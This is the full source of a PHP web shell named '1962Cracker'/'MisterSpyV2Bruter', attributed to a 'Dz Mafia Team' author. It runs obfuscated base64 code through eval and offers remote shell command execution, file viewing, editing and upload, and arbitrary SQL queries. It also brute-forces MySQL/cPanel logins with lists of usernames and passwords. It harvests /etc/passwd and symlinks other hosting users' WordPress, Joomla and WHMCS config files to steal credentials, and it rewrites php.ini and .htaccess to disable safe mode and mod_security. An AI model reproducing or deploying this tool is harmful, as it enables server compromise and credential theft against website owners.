MisterSpyV2Bruter
<?php
 	
	@set_time_limit(0);
	@error_reporting(0);




$Getconfig = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
eval(base64_decode($Getconfig));

	function in($type,$name,$size,$value,$checked=0)
	 {
	 $ret = "<input type=".$type." name=".$name." "; if($size != 0)
	 {
	 $ret .= "size=".$size." "; }
	 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }

	class my_sql
	 {
	 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': if(empty($this->port))
	 {
	 $this->port = '3306'; }
	 if(!function_exists('mysqli_connect')) return 0; $this->connection = @mysqli_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(empty($this->port))
	 {
	 $this->port = '1433'; }
	 if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port))
	 {
	 $this->port = '5432'; }
	 $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
	 return 0; }
	 function select_db()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': if(@mysqli_select_db($this->base,$this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
	 return 0; }
	 function query($query)
	 {
	 $this->res=$this->error=''; switch($this->db)
	 {
	 case 'mysqli': if(false===($this->res=@mysqli_query('/*'.chr(0).'*/'.$query,$this->connection)))
	 {
	 $this->error = @mysqli_error($this->connection); return 0; }
	 else if(is_resource($this->res))
	 {
	 return 1; }
	 return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection)))
	 {
	 $this->error = 'Query error'; return 0; }
	 else if(@mssql_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query)))
	 {
	 $this->error = @pg_last_error($this->connection); return 0; }
	 else if(@pg_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query)))
	 {
	 $this->error = 'Query parse error'; }
	 else
	 {
	 if(@ociexecute($this->res))
	 {
	 if(@ocirowcount($this->res) != 0) return 2; return 1; }
	 $error = @ocierror(); $this->error=$error['message']; }
	 break; }
	 return 0; }
	 function get_result()
	 {
	 $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db)
	 {
	 case 'mysqli': $this->num_rows=@mysqli_num_rows($this->res); $this->num_fields=@mysqli_num_fields($this->res); while(false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))); @mysqli_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; }
	 return 0; }
	 function dump($table)
	 {
	 if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '##'; $this->dump[1] = '## --------------------------------------- '; $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '## Database: '.$this->base; $this->dump[4] = '##    Table: '.$table; $this->dump[5] = '## --------------------------------------- '; switch($this->db)
	 {
	 case 'mysqli': $this->dump[0] = '## mysqli dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '## --------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @mysqli_real_escape_string($v);}
	 $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'Oracle': $this->dump[0] = '## ORACLE dump'; $this->dump[] = '## under construction'; break; default: return 0; break; }
	 return 1; }
	 function close()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': @mysqli_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
	 }
	 function affected_rows()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': return @mysqli_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
	 }
	 }
	 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name']))
	 {
	 if(!$file=@fopen($_POST['d_name'],"r"))
	 {
	 err(1,$_POST['d_name']); $_POST['cccc']=""; }
	 else
	 {
	 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding))
	 {
	 header('Content-Encoding: ' . $content_encoding); }
	 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump; exit(); }
	 }
	 if(isset($_GET['phpinfo']))
	 {
	 echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
	 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query")
	 {
	 echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysqli_l']; $sql->pass = $_POST['mysqli_p']; $sql->base = $_POST['mysqli_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 foreach($querys as $num=>$query)
	 {
	 if(strlen($query)>5)
	 {
	 echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query))
	 {
	 case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result())
	 {
	 echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++)
	 {
	 foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
	 echo "</table>"; }
	 break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
	 }
	 }
	 }
	 }
	 echo "<br><title>1962Cracker By Akram Stelle</title><form name=form method=POST>";
	 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysqli_l',0,$_POST['mysqli_l']); echo in('hidden','mysqli_p',0,$_POST['mysqli_p']); echo in('hidden','mysqli_db',0,$_POST['mysqli_db']); echo in('hidden','cccc',0,'db_query');
	 echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysqli_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }























	function ccmmdd($ccmmdd2,$att)
	{
	global $ccmmdd2,$att;
	echo '
	<table style="width: 100%" class="style1" dir="rtl">
		<tr>
			<td class="style9"><strong>???H?/strong></td>
		</tr>
		<tr>
			<td class="style13">
					<form method="post">
						<select name="att" dir="rtl" style="height: 109px" size="6">
	';
	if($_POST['att']==null)
	{
	echo '						<option value="system" selected="">system</option>';
	}else{
	echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
							<option value=system>system</option>
	";


	}

	echo '
							<option value="passthru">passthru</option>
							<option value="exec">exec</option>
							<option value="shell_exec">shell_exec</option>
						</select>
							<input name="page" value="ccmmdd" type="hidden"><br>
							<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
							<input type="submit" value="???>
					</form>

			</td>
		</tr>
		<tr>
			<td class="style13">
	';

			if($_POST[att]=='system')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						system($_POST['ccmmdd2']);
	echo '					</textarea>';


			}

			if($_POST[att]=='passthru')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						passthru($_POST['ccmmdd2']);
	echo '					</textarea>';


			}





			if($_POST[att]=='exec')
			{

	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						exec($_POST['ccmmdd2'],$res);
					echo $res = join("\n",$res);
	echo '					</textarea>';


			}







			if($_POST[att]=='shell_exec')
			{

	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					echo	shell_exec($_POST['ccmmdd2']);
	echo '					</textarea>';


			}
	echo '
			</td>
		</tr>
	</table>
	';

	exit;
	}

	if($_POST['page']=='edit')
	{

	$code=@str_replace("\r\n","\n",$_POST['code']);
	$code=@str_replace('\\','',$code);
	$fp = fopen($pathclass, 'w');
	fwrite($fp,"$code");
	fclose($fp);
	echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
	exit;
	}







		if($_POST['page']=='show')
		{
		$pathclass =$_POST['pathclass'];
	echo '
	<form method="POST">
	<input type="hidden" name="page" value="edit">
	';

		$sahacker = fopen($pathclass, "rb");
	echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';
	$code = fread($sahacker, filesize($pathclass));
	echo $code =htmlspecialchars($code);
	echo '</textarea>';
		fclose($sahacker);
	echo '
	<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
	<br><strong><input type="submit" value="edit file">
	</form>
	';
			exit;
		}




		if($_POST['page']=='ccmmdd')
		{
		echo ccmmdd($ccmmdd2,$att);
		exit;
		}
























	if($_POST['page']=='find')
	{
	if(isset($_POST['usernames']) && isset($_POST['passwords']))
	{
			if($_POST['type'] == 'passwd'){
					$e = explode("\n",$_POST['usernames']);
					foreach($e as $value){
					$k = explode(":",$value);
					$username .= $k['0']." ";
					}
			}elseif($_POST['type'] == 'simple'){
					$username = str_replace("\n",' ',$_POST['usernames']);
			}
			$a1 = explode(" ",$username);
			$a2 = explode("\n",$_POST['passwords']);
			$id2 = count($a2);
			$ok = 0;
			foreach($a1 as $user )
			{
					if($user !== '')
					{
					$user=trim($user);
					 for($i=0;$i<=$id2;$i++)
					 {
							$pass = trim($a2[$i]);
							if(@mysqli_connect('localhost',$user,$pass))
							{
									echo "<cpanel>$user|$pass</cpanel><br />";
									$ok++;
							}
					 }
					}
			}
			echo "<hr><b>You Found <font color=green>$ok</font> cPanel (1962Cracker)</b>";
			exit;
	}
	}


 ?>


 <form method="POST" target="_blank">
  <strong>
   <input name="page" type="hidden" value="find">

   </tr>
   <tr>
   <td>
   <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>User :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="usernames"></textarea></strong></td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>Pass :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="passwords"></textarea></strong></td>
   </tr>

   <tr>
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>Type :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
   <span class="style2"><strong>Simple : </strong> </span>
  <strong>
  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
   <font class="style2"><strong>/etc/passwd : </strong> </font>
  <strong>
  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
  </span>
   </td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="start">

   </td>
   <tr>
 </form>

<form method=post>
<input type=submit name="usre" value="Get Usernames & Config !" /></form>




<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value=" Get Configuration Files :)" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{

$dir=mkdir('dzmafia',0777);
$r = " Options all \n DirectoryIndex dz.html \n Require None \n Satisfy Any";
$f = fopen('dzmafia/.htaccess','w');

fwrite($f,$r);
$consym="<a href=dzmafia/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked By The 1962 Script Coded By Akram Stelle (Dz Mafia Team)<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="dzmafia/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>

    </tr>

   <td valign="top" colspan="6"><strong></strong></td>

 <form method="POST" target="_blank">
 <strong>
 <input type="hidden" name="go" value="cmd_mysqli">
    </strong>
    <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>CMD mysqli</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>user</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_l" type="text"></strong></td>
   <td valign="top" bgcolor="#151515"><strong>pass</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_p" type="text"></strong></td>
   <td valign="top" bgcolor="#151515"><strong>database</strong></td>
   <td valign="top" bgcolor="#151515"><strong><input name="mysqli_db" type="text"></strong></td>
       </tr>
      <tr>
   <td valign="top" bgcolor="#151515" style="height: 25px; width: 139px;">
  <strong>cmd ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5" style="height: 25px">
  <strong>
  <textarea name="db_query" style="width: 353px; height: 89px">SHOW DATABASES;
 SHOW TABLES user_vb ;
 SELECT * FROM user;
 SELECT version();
 SELECT user();</textarea></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="run"></strong></td>
    </tr>
 <input name="db" value="mysqli" type="hidden">
 <input name="db_server" type="hidden" value="localhost">
 <input name="db_port" type="hidden" value="3306">
 <input name="cccc" type="hidden" value="db_query">

 </form>
   <tr>
   <td valign="top" bgcolor="#151515" colspan="6"><strong></strong></td>


   </tr>

 <form method="POST" target="_blank">
   <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>CMD
  system - passthru - exec - shell_exec</strong></td>
       </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>cmd ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
      <select name="att" dir="rtl"  size="1">
<?php
 if($_POST['att']==null)
 {
 echo '      <option value="system" selected="">system</option>';
 }else{
 echo "      <option value='$_POST[att]' selected=''>$_POST[att]</option>
       <option value=system>system</option>
 ";


 }
?>

       <option value="passthru">passthru</option>
       <option value="exec">exec</option>
       <option value="shell_exec">shell_exec</option>
      </select>
   <strong>
 <input name="page" type="hidden" value="ccmmdd">
  <input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Go"></strong></td>
    </tr>
 </form>

 <form method="POST" target="_blank">

   <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Show
  File And Edit</strong></td>
       </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Path ~</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
  <input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"></strong></td>
    </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="show"></strong></td>
       </tr>
 <input name="page" type="hidden" value="show">
 </form>

     <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Tools</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Upload</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUCSES :) !!!</b><br><br>'; }
 else { echo '<b>Upload Failed :( !!!</b><br><br>'; }
}
?>
     <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Server Info</strong></td>
       </tr>
    <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
 <?php
 $safe_mode = ini_get('safe_mode');
 if($safe_mode=='1')
 {
 echo 'ON';
 }else{
 echo 'OFF';
 }

 ?>
  </strong>
  </td>
       </tr>

          <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Uname</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
<?php
echo '<b><br>'.php_uname().'<br></b>';
?>
</tr>
</td>

                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Kill Safe Mode</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
<strong>

<?php
echo "<right>";
echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
 <p align='center'>
 <INPUT type='submit' name='Kill' value='if Safe Mode is On Clic Here To Kill The SafeMode [ini.php] [php.ini] [.htaccess]' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-width: 1px'></p>
</form>
";
echo "<right/>";
if  (empty($_POST['Kill'] ) ) {
 }ELSE{
 $action = '?action=Kill';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<b>[SafeMode Done] .. :) This Script Is Coded By Akram Stelle (Dz Mafia Team)</b>";
echo ("<br>");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
KillFilterEngine Off
KillFilterScanPOST Off
KillFilterCheckURLEncoding Off
KillFilterCheckUnicodeEncoding Off
</IfModule>
");


echo "<b>[Mod_Security Done]</b><br>";

    echo "<font><center></td></tr><table> ";

 }
?>

</strong>
</tr>
</td>
<tr>

  <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>SerVer Search</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
  <strong>
<?php


echo " <center> </center>";
$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "Server IP = <font color=red>".gethostbyname($_SERVER["HTTP_HOST"])."
 </font>[</span>
 <a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">Bing Search</a>][</span><a href='http://zone-h.com/archive/ip=".$serverIP."' target=\"_blank\">Zone-H Search</a>]<center>";
?>
</strong>
</tr>
</td>
        <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong> KrimOu Expect Us</strong></td>
       </tr>
